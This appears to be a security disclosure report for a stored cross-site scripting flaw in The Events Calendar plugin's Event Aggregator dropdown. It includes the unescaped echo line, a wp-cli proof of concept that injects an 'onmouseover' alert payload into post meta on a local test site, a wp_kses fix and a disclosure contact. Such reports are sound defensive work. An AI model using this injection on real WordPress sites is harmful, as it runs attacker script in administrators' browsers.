# TEC-XSS-024: Stored XSS in Aggregator Category Dropdown

## Metadata
- **Plugin:** The Events Calendar (Event Aggregator feature)
- **Severity:** Medium (CVSS 4.8)
- **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`
- **CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
- **Auth Required:** Administrator (to write aggregator post meta)
- **User Interaction:** Required (admin visits aggregator page)

## Summary

The aggregator import form template echoes `$category_dropdown` without escaping, where the dropdown HTML is constructed using post meta values (`_default_category`) that may contain unescaped attributes. An attacker who can write to aggregator record post meta can inject HTML attributes (e.g., `onmouseover`) into the rendered dropdown.

## Vulnerable Code

```php
// In the aggregator import form template:
echo $category_dropdown;
// $category_dropdown is built with preg_replace using $default_category from post meta
```

## Proof of Concept

```bash
# 1. Find or create an aggregator record and inject attribute
docker compose -f docker/docker-compose.yml exec -T wpcli \
  php -d memory_limit=1024M /usr/local/bin/wp eval '
    $id = wp_insert_post([
      "post_type" => "tribe-ea-record",
      "post_title" => "Test Aggregator Record",
      "post_status" => "draft"
    ]);
    update_post_meta($id, "_default_category",
      "\" onmouseover=\"alert(document.domain)\" data-x=\"");
    echo "Injected on record $id\n";
  ' --skip-plugins

# 2. Visit the aggregator page:
# http://localhost:8880/wp-admin/edit.php?post_type=tribe_events&page=aggregator

# 3. Hover over the category dropdown to trigger
```

## Impact

Admin-on-admin XSS limited to the aggregator feature. Requires prior write access to aggregator record post meta.

## Remediation

```php
echo wp_kses($category_dropdown, [
    'select' => ['name' => [], 'id' => [], 'class' => []],
    'option' => ['value' => [], 'selected' => []]
]);
```

## Disclosure

- Report to: security@theeventscalendar.com
- Standard 90-day responsible disclosure timeline
